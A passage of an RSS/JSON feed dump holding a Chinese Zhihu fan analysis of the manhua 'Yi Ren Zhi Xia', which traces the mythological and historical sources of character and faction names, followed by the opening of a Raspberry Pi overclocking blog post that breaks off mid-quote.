data-rawwidth=\"779\" data-rawheight=\"366\" data-watermark=\"watermark\" data-original-src=\"v2-be2e55e5fa3b416ae8ffa60b286cc9ab\" data-watermark-src=\"v2-0b368f26cc81c6f38cfbf827c85aecf4\" data-private-watermark-src=\"\"></p>\n<p>这位站立在巫术终结和科学兴起的历史转折点上的天才，通过对未知世界永无止境的探索，使他成为有史以来最伟大的科学家之一，也使他将自己一生中更多的精力花费在炼金术上，牛顿总共留下50多万英文单词的炼金术手稿和100多万单词的神学手稿，而这些工作与他的科学发现很难说是毫无关联的。值得注意的是塔伯院长与牛顿同名也叫艾萨克；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-379fbcbf8f9950c6140295ba763d09a6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-379fbcbf8f9950c6140295ba763d09a6\" data-watermark-src=\"v2-24464dcdf2abdfc37df1bbbfe2e0bf06\" data-private-watermark-src=\"\"></p>\n<p>从之前的怀念画面也可以看出，弗拉梅尔学院和塔伯院长可能也曾隶属于欧洲翡翠学会；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-914b18a24c49ce0865032affa1e92e20_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"190\" data-watermark=\"watermark\" data-original-src=\"v2-914b18a24c49ce0865032affa1e92e20\" data-watermark-src=\"v2-c89b8b37d6217141e65e3d4b56e6b6bc\" data-private-watermark-src=\"\"></p>\n<p><b>3.斯宾塞</b></p>\n<p>这位欧洲翡翠学会的理事叫做威廉斯宾塞；威廉是一个非常常见的西方名字；而历史上也有一位比较著名的斯宾塞；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bef177f905feaa58d87b0df1ce44032f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"159\" data-watermark=\"watermark\" data-original-src=\"v2-bef177f905feaa58d87b0df1ce44032f\" data-watermark-src=\"v2-36a9bc65b675dd9c5091b8a4562fe1ba\" data-private-watermark-src=\"\"></p>\n<p>赫伯特·斯宾塞；英国哲学家、社会学家、教育家。他为人所共知的就是“社会达尔文主义之父”，所提出一套的学说把进化理论适者生存应用在社会学上尤其是教育及阶级斗争，是在理论上阐述进化论的英国哲学家先驱。也是艺术起源中游戏说的提出者（游戏说认为：艺术是天赋者内心剩余精力的发泄）；上期提到弗雷泽，这次提到斯宾塞，二叔难不成在研究艺术史？（个人猜想）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d01fa95a61de33b56d2edc6dc15db35e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"668\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-d01fa95a61de33b56d2edc6dc15db35e\" data-watermark-src=\"v2-0583761f101e4514d12659d11ff398ac\" data-private-watermark-src=\"\"></p>\n<p>对了，斯宾塞认为：教育的目的和任务在于教导每一个人怎样去过“完美”的生活。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-93274408b1148217e8aa69e832be1de0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"153\" data-watermark=\"watermark\" data-original-src=\"v2-93274408b1148217e8aa69e832be1de0\" data-watermark-src=\"v2-84174332148a9b658743bb11d40655ca\" data-private-watermark-src=\"\"></p>\n<h2><b>大地之子</b></h2>\n<p>说实话，结合人种妆容服饰，这位莉莉娅会长以及她所在大地之子工会都没有太多的可以确定的东西；只能说个人感觉更接近南美或北非的服饰风格（个人猜测）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-05c620f5cf8bcb5570e3185e079d47de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-05c620f5cf8bcb5570e3185e079d47de\" data-watermark-src=\"v2-183738600455eac099cba3213058c2b3\" data-private-watermark-src=\"\"></p>\n<p><b>1.盖亚</b></p>\n<p>同样的，大地之子也并没有太多联想到的线索，如果有其他想法法朋友欢迎在评论区写出；非要说的话，北非南美宗教受希腊影响出现的盖亚崇拜可能与之有那么一点关联；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b39ff62096684d4180411a3d27eb4031_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"265\" data-watermark=\"watermark\" data-original-src=\"v2-b39ff62096684d4180411a3d27eb4031\" data-watermark-src=\"v2-39b2ae92c46435073ec77a097af9bc07\" data-private-watermark-src=\"\"></p>\n<p>盖亚：也是希腊神话中第一位超原始神明，她是大地的神格化，是第一位真正意义上的创世神，也是能创造生命的原始自然力之一（大地）。她的出现标志着混沌开始由无序转为有序，也标志着万物开始产生。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3caa769ea33b9b39244e59a088e4b0e9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-3caa769ea33b9b39244e59a088e4b0e9\" data-watermark-src=\"v2-c8e44777b06eec8bc9dacc473d21d1fb\" data-private-watermark-src=\"\"></p>\n<p><b>2.那罗伽</b></p>\n<p>那罗伽是古印度神话中的阿修罗王，也曾被称为：大地之子。他曾将阿底提的耳环盗至其城堡钵罗耆阍奥提娑。后来，黑天受诸天神之托，杀死那罗伽，夺回此宝。而且在梵语中那罗伽被音译为地狱；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fba7c4727a8a97ff0e976d05185e9034_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1151\" data-rawheight=\"409\" data-watermark=\"watermark\" data-original-src=\"v2-fba7c4727a8a97ff0e976d05185e9034\" data-watermark-src=\"v2-13bf891748e55f62c3f37845b9e96aca\" data-private-watermark-src=\"v2-89092d03a30d4ba7b3bafed6ea332535\"></p>\n<p><b>3.地母神</b></p>\n<p>还有知友 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/cff24f1b490a04946b663b40a4584ee3\" data-hash=\"cff24f1b490a04946b663b40a4584ee3\" data-hovercard=\"p$b$cff24f1b490a04946b663b40a4584ee3\">@幻化千叶</a> 提到的：个人理解，大地之子应该是信仰地母神的女巫组织。莉莉娅女士的装扮有明显的吉普赛女巫的特色（头巾和略显浮夸的首饰）。地母神，亦称为大地之母或母神是指专司繁殖力及象征大地恩惠的女神，在这个范畴中并不是所有的女神都能被称呼为地母神。随着一神教的流行，地母神极其祭祀也逐渐沦为魔女或者女巫。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-94632f5746f373f8728301bdf3868f1e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"742\" data-rawheight=\"211\" data-watermark=\"watermark\" data-original-src=\"v2-94632f5746f373f8728301bdf3868f1e\" data-watermark-src=\"v2-7353ad236e55ad11b04de3b4a2a5a641\" data-private-watermark-src=\"v2-5f8faefb9925d4f6a5003325c937dfbf\"></p>\n<p>如果这里的巫女元素匹配，就和之前以利亚弄错的波曼可以相联结（不过波曼属于巫毒体系）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3389f7850e4bb51872774653509cd9cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"284\" data-watermark=\"watermark\" data-original-src=\"v2-3389f7850e4bb51872774653509cd9cd\" data-watermark-src=\"v2-8892881f519566a3a445b29ae57f3eee\" data-private-watermark-src=\"v2-1d2ada378130714191a976f74fa6aae4\"></p>\n<p>如果这里的大地之子不是个比喻句的话，那或许他们的官方也掌握着和节气谷纳森岛类似的仙踪；（个人猜测）</p>\n<h2>异人馆</h2>\n<p>在泰国，有很强的会馆文化，所谓会馆原本是指各地商户在外地互相帮扶的聚集地店；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-10962455d126d341a6d77c422ce0fe71_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-10962455d126d341a6d77c422ce0fe71\" data-watermark-src=\"v2-7ff93898e272fbd7bd09458514b055a8\" data-private-watermark-src=\"\"></p>\n<p><b>1.九属会馆</b></p>\n<p>泰国有九属会馆，九属是：潮州，客家，广府，福建，海南，云南，广西，浙江和台湾；九家会馆。一般是这些地方的华人后裔建立的，他们对中国的了解要比普通泰国人深入的多。但是其实也带有他们独特的视角和宗族理念。尤其是看待来泰国工作投资的中国人，就带有一定的利益连带关系。而与之相似的，所谓异人馆可能就是异人之间相互帮扶的机密组织吧；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b7624306035dae20d77c8fdd3a167cb3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"374\" data-watermark=\"watermark\" data-original-src=\"v2-b7624306035dae20d77c8fdd3a167cb3\" data-watermark-src=\"v2-fb6b827faf1f2d4758b1f49e185e5b0f\" data-private-watermark-src=\"\"></p>\n<p><b>2.查侬</b></p>\n<p>众所周知这个篇章是用来填坑的，世界上有那么多国家和地区；泰国能有如此待遇除了泰国本身丰富的历史文化外，更重要可能就是与之前出现的的关系；漫画344话比比肺活量中查侬的这一招应该是泰拳中的神猴腾空（ HakKung Ai-yara）这招出自一个泰国的神庙传说；是猴神曼加尔的法相显现；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8cbc94f7d6ab91fd060175f4442f3435_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"823\" data-rawheight=\"432\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>石川流</b></h2>\n<p>佛剑石川家所在的门派，之前已经介绍过几次他们的过去了，这里就不赘述了；目前已知下图左手是石川信的儿子，右边是日本异人组织的成员；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d4a02c659c0d5317812c73c7c7404990_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"306\" data-watermark=\"watermark\" data-original-src=\"v2-d4a02c659c0d5317812c73c7c7404990\" data-watermark-src=\"v2-13270685ffa18beac3a8a28c0bcb66f9\" data-private-watermark-src=\"\"></p>\n<p><b>1.石川流</b></p>\n<p>这次用的称呼不是石川家了而是石川流，因为这里女子的称呼是会长，说明石川信并不只是以家族或个人的身份来访，而是日本类似哪都通部门的会长；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e003e39bca229afe3dfeff7a89aaea6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"165\" data-watermark=\"watermark\" data-original-src=\"v2-7e003e39bca229afe3dfeff7a89aaea6\" data-watermark-src=\"v2-f582d396dacb905ec47d84fa67aa4b7c\" data-private-watermark-src=\"\"></p>\n<p><b>2.妖刀蛭丸</b></p>\n<p>另一方面，在说到纳森卫的承诺时，石川信说，和他们相似，这里应该就是指妖刀蛭丸；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-986597f6a9d5076ac3070e7f8d2c71fc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"280\" data-watermark=\"watermark\" data-original-src=\"v2-986597f6a9d5076ac3070e7f8d2c71fc\" data-watermark-src=\"v2-c2b2dafc80599599be28a84c05533bca\" data-private-watermark-src=\"\"></p>\n<p>结合上回所说的时代守护；那么蛭丸（蛭是一类生物的统称，以多营暂时性的体外寄生生活，以吸食其他动物的体液或血液为生。）这个名字漫画中对炼器和剑仙的解释；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c2ec44c23eff7d48d2b697bd5bee12f0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"227\" data-watermark=\"watermark\" data-original-src=\"v2-c2ec44c23eff7d48d2b697bd5bee12f0\" data-watermark-src=\"v2-77e2dae0d82f5d8b3d9e40f9e94f0068\" data-private-watermark-src=\"\"></p>\n<p>我觉得可能石川家之前已经世世代代用炁在喂养这把本寓意着不详的妖刀；甚至以及和漫画中的“家仙”一样成为了某种家族象征；（上周也提到过就不过多赘述了）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c1e1cb4704f934490d8976581a99360_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"263\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>贝希摩斯</b></h2>\n<p>贝希摩斯，漫画中提到的一家新兴的美国公司，能用工业手段制造法器；服务遍布世界，虽然成立的时间不长，却有一定的野心；并且并未确定其是否完全代表美国异人（毕竟只是一家公司）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d3d10b31ee234f0a1552dbf503b4d8e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"345\" data-watermark=\"watermark\" data-original-src=\"v2-4d3d10b31ee234f0a1552dbf503b4d8e\" data-watermark-src=\"v2-d696d5e1ec95d404948ac488b1272c8c\" data-private-watermark-src=\"\"></p>\n<p><b>1.贝希摩斯</b></p>\n<p>贝希摩斯（Behemoth）是在《圣经》中出现的怪物，传说上帝在创世纪第六天用粘土创造了贝希摩斯和利维坦，它的尾巴如杉木般挺直，肌肉如石头般结实，骨骼如铜铁般坚硬。在中世纪的时候他被恶魔诱惑加入了地狱的阵容。旧约解经书《米大示》称其为无敌的生物，只有耶和华的剑才能杀死它。而《次经》中提到“一饱口福”云云，当指末日的弥赛亚盛宴。那时巨兽和海魔将会大战，最后同归于尽，与巨鸟席兹一起成为圣洁者的食物。另有种说法它们都将被投入深渊。   （下图可以颠倒过来看）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2e5b453bbb68e0457db1fb5da8648995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1184\" data-rawheight=\"682\" data-watermark=\"watermark\" data-original-src=\"v2-2e5b453bbb68e0457db1fb5da8648995\" data-watermark-src=\"v2-815be0e9ef037bc0bf54ac6578eee237\" data-private-watermark-src=\"\"></p>\n<p>但其实，抛开这些复杂的设定，贝希摩斯最直观的特点就是两个：巨大与贪婪；就和中国神话中的饕餮一样；二叔设定上的指代似乎也已经不言而喻了；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7034604529428c5faafb1fbad7250302_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"238\" data-watermark=\"watermark\" data-original-src=\"v2-7034604529428c5faafb1fbad7250302\" data-watermark-src=\"v2-609b80ebcf74dc1fff30836e80a4ea7d\" data-private-watermark-src=\"\"></p>\n<p><b>2.工业法器</b></p>\n<p>在漫画532话中出现了能够翻译常见语种的“助听器”，虽然我们都知道这个道具是为了解决漫画中的预言问题而设计出来的；这十有八九就是贝希摩斯的产品了；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-99a039edfcdd1bc213650a84dc6745cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"851\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-99a039edfcdd1bc213650a84dc6745cd\" data-watermark-src=\"v2-56a95684a65a6bbee23f52dc13244ab7\" data-private-watermark-src=\"\"></p>\n<p>但是注意四哥对这玩意的称呼：半个法器；这似乎也间接说明了贝希摩斯公司已经掌握了工业化打造法器的方法；如果法器可以批量制造，那按照之前的理论：对社会的威胁其实不小于神机百炼；或者反过来说，贝希摩斯有可能受到了神机百炼的协助，才得以批量制造法器（个人脑洞，点到即止）如此看来，在网上与二壮交手的也有可能是贝希摩斯的人；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-74366b8b81c662bbfe21d6662af75948_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"367\" data-watermark=\"watermark\" data-original-src=\"v2-74366b8b81c662bbfe21d6662af75948\" data-watermark-src=\"v2-0ea4024a1fc2d9ffa43f8fa0f2a9f430\" data-private-watermark-src=\"\"></p>\n<p>不过目前看来贝希摩斯对自己的技术把控的还是比较严格的，像下图三哥说的，法器用完还要还给他们；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-60bfb3440f55f169d5d97fca91e79f9e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"237\" data-watermark=\"watermark\" data-original-src=\"v2-60bfb3440f55f169d5d97fca91e79f9e\" data-watermark-src=\"v2-527bd461a9cbf5cc25e3656e14831a69\" data-private-watermark-src=\"\"></p>\n<p>可能就是有了制造生活法器的技术力和批量生产的生产力，贝希摩斯才敢于说自己是家世界公司（这个倒不至于吐槽老美，我们很多企业也已经有了这样的觉悟，全球化终究是必然趋势）可能正是这样的实力贝希摩斯才有底气说出：包括纳森岛吧。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"829\" data-rawheight=\"296\" data-watermark=\"watermark\" data-original-src=\"v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7\" data-watermark-src=\"v2-43b7833242983496b90f94e6176e9e3a\" data-private-watermark-src=\"\"></p>\n<p>但这里凯勒没有说时态，如果纳森岛已经使用了贝希摩斯的技术那可能岛上的生活水平要比我们之前想象的要好；（毕竟纳森卫都穿的干干净净的）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ab0cf5e7685cc34b7f7b01ac77bc4f47_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"828\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-ab0cf5e7685cc34b7f7b01ac77bc4f47\" data-watermark-src=\"v2-2299bd075ed7fb9789fc70eed98f2ea4\" data-private-watermark-src=\"\"></p>\n<p><b>3.美国工会</b></p>\n<p>还是之前那个论调，目前其实不能肯定贝希摩斯是否完全代表美国异人，毕竟贝希摩斯只是一家公司，而且和哪都通不一样，这家公司是以公司为主体的；服务与“世界人民”的公司，那么我有理由相信美国本土应该还是有类似哪都通的存在；毕竟美国缺席上一次异人大会确实不太可能；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-19e164021f30e6d73f9e2f67e1a21357_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"269\" data-watermark=\"watermark\" data-original-src=\"v2-19e164021f30e6d73f9e2f67e1a21357\" data-watermark-src=\"v2-c2208ff2ba221b6269c0ef88b20aa730\" data-private-watermark-src=\"\"></p>\n<h2><b>纳森岛</b></h2>\n<p>纳森岛已经说了三期了，但这次还是有很多新的个人观点想和大家分享；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-af21bfce694261131f83e9444c67a21f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"935\" data-rawheight=\"342\" data-watermark=\"watermark\" data-original-src=\"v2-af21bfce694261131f83e9444c67a21f\" data-watermark-src=\"v2-759d97b4e6ec38a901f4e0640ae890e2\" data-private-watermark-src=\"\"></p>\n<p><b>1.阿方索</b></p>\n<p>首先来说一下小个子阿方索，阿方索这个名字曾为那不勒斯王国皇家所用；不算是一个很常见的名字但是目前没查到有什么隐喻；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3013c9788c8022351a27f1fb3faec5b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"260\" data-watermark=\"watermark\" data-original-src=\"v2-3013c9788c8022351a27f1fb3faec5b6\" data-watermark-src=\"v2-84c29ced3cbe1fcbf89471d20b935135\" data-private-watermark-src=\"\"></p>\n<p>我之前一直以为，纳瑟卫服务于王是因为某种禁制术，毕竟以利亚亲口说过，自己不喜欢在纳瑟的感觉；所以我以为所谓的为诺言而生是他们被禁制术束缚；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1733b6cb156ea70e3b53f0594c8f30af_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"845\" data-rawheight=\"447\" data-watermark=\"watermark\" data-original-src=\"v2-1733b6cb156ea70e3b53f0594c8f30af\" data-watermark-src=\"v2-d55e4c9c45cbc02a3f5ebd89c26a5cf1\" data-private-watermark-src=\"\"></p>\n<p>但看了阿方索的反映后，我感受到纳森卫，至少阿方索对王的认可是完全发自内心的；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b47099ecaf78fd7ef3dbb463c2d921aa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"204\" data-watermark=\"watermark\" data-original-src=\"v2-b47099ecaf78fd7ef3dbb463c2d921aa\" data-watermark-src=\"v2-8c35075a749409a035affd13f759043e\" data-private-watermark-src=\"\"></p>\n<p><b>2.纳森王</b></p>\n<p>回来说被宝儿姐干趴下的纳森王，二叔以前就说过如果要画纳森那肯定是个独立的篇章；看得出来纳森卫和宝儿姐一样是个姑娘；至于势力，宝儿姐当时算偷袭，也不能确定王的真实实力；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-00cb0fd1f8df66de93f849444e86aa6e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"335\" data-watermark=\"watermark\" data-original-src=\"v2-00cb0fd1f8df66de93f849444e86aa6e\" data-watermark-src=\"v2-8d492d885c11ec1859d180ba9ad5750b\" data-private-watermark-src=\"\"></p>\n<p>不过有一点可以肯定，就是以利亚说的：王，是神选之人；是异人中的异人；所以王的天赋是毋庸置疑的；所以以利亚才能那么坦诚的说：我们并不是神选之人，</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6a62bcbbd5df67c8c65fda0ec9f87669_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"264\" data-watermark=\"watermark\" data-original-src=\"v2-6a62bcbbd5df67c8c65fda0ec9f87669\" data-watermark-src=\"v2-66849892736005eface7d9773cdd97a3\" data-private-watermark-src=\"\"></p>\n<p>纳森王异人中的异人这点，其实也和宝儿姐非常相似；这却也是张怀义一直叮嘱张楚岚避免成为的人；木秀于林风必摧之；也许正是因此当年大祭司才规定了纳森卫保卫纳森王的传统吧；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e3e4664051dec51b1873b347f57196a9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"316\" data-watermark=\"watermark\" data-original-src=\"v2-e3e4664051dec51b1873b347f57196a9\" data-watermark-src=\"v2-df5dd4d3e0ff91118e40d4fff93bd838\" data-private-watermark-src=\"\"></p>\n<p><b>3.投石问路</b></p>\n<p>这里还有一个问题，那就是他们为什么要袭击三哥？或者说为什么要丢石头？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e99954fe51e74ab9e6adf21c63b0d3a3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"251\" data-watermark=\"watermark\" data-original-src=\"v2-e99954fe51e74ab9e6adf21c63b0d3a3\" data-watermark-src=\"v2-2cd2c1e2901f5a87d598732be038d01c\" data-private-watermark-src=\"v2-b697507364d57b1b6f75716acde6ef50\"></p>\n<p>事出反常必有妖；按照以利亚和阿方索的对话来看，他们仿佛已经知道了会有拦车？甚至这后面的事情可能都有一部分的安排好的；（应该不包括王被暴打）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f022f952062c2ad9c16e65570578d746_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"741\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-f022f952062c2ad9c16e65570578d746\" data-watermark-src=\"v2-a3dbbfe867e4b021f66a90fabfd56937\" data-private-watermark-src=\"v2-21ac012c6fa563d5a14d1b185002b28c\"></p>\n<p>那如果是这样纳森方面可能真的拥有某位可以预判危机的角色来策划了这场事件？如果把投石和预判这两个关键词结合起来，去找西方传说中的对应；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1dfea935cdd8bba4d26e4ac7f245933e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"207\" data-watermark=\"watermark\" data-original-src=\"v2-1dfea935cdd8bba4d26e4ac7f245933e\" data-watermark-src=\"v2-6905b714317a8b72e9d498ee4d2bea8d\" data-private-watermark-src=\"v2-55def948b3f4e2875524d62f7dc62410\"></p>\n<p>大卫投石；取材于《旧约》中的神话故事。大卫是一个圣经中的人物，公元前1010年至970年是以色列王。他在位时推翻了异族非利士人的统治，使以色列得到统一。打倒巨人歌利亚的投石器。五块石头代表大卫的宽容，四次会打偏，而第五次必然会命中，并打倒敌人。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-efd9e0a88297551d35e8251d6fce4bb1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"736\" data-rawheight=\"244\" data-watermark=\"watermark\" data-original-src=\"v2-efd9e0a88297551d35e8251d6fce4bb1\" data-watermark-src=\"v2-ba2e7596705519f56c8c546d4a9a7fb3\" data-private-watermark-src=\"v2-a8144fed3b22027e1aaa8b6c347020cd\"></p>\n<p>（以上仅为个人猜测）</p>\n<p><b>个人想法</b></p>\n<p>这个世界上不是所有秘密的答案都叫无根生的，如果是那样的话，那这个世界也太无趣了；其实二叔之前在创作的时候就提到过将来会做外国异人的番外，未知的世界才是更真实有趣的世界；期待后续篇章的更新；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-91e9c0805ee04798b1f7f6b9d315f18e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"192\" data-watermark=\"watermark\" data-original-src=\"v2-91e9c0805ee04798b1f7f6b9d315f18e\" data-watermark-src=\"v2-2870708ebaf07db1f026dd48f16786df\" data-private-watermark-src=\"v2-8fa7ecd0ef22b3672c985808e84ee49d\"></p>\n<hr>\n<p>以下是之前对纳森岛和外国异人的整理和猜测，为了节省篇幅就不在这里赘述了：</p>\n<a href=\"https://www.zhihu.com/question/466970964/answer/1959555863\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-8a848cb4bd5f11f7f3a1b2b24210d254_200x0.jpg\" data-image-width=\"948\" data-image-height=\"2000\" class=\"internal\">如何评价《一人之下》532（565）话？</a><a href=\"https://www.zhihu.com/question/464193183/answer/1934211068\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-bdba958ccddc978a4ff42f0c80af1423_bh.jpg\" data-image-width=\"1600\" data-image-height=\"720\" class=\"internal\">如何评价《一人之下》530（562）话？</a><a href=\"https://www.zhihu.com/column/c_1264966216768692224\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-28243c09e18dc58c62df761ed87850a5_l.jpg\" data-image-width=\"167\" data-image-height=\"167\" class=\"internal\">一人之下•门派录</a><p><img src=\"https://pic1.zhimg.com/v2-5c10e13da4092b73d90f0456e1b82aee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"254\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>整理不易，跪求点赞<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">56 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/317204661?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》402话？</a><br><a href=\"http://www.zhihu.com/question/304359766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一人之下中的马仙洪各位怎么评价？</a><br>\n","link":"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># 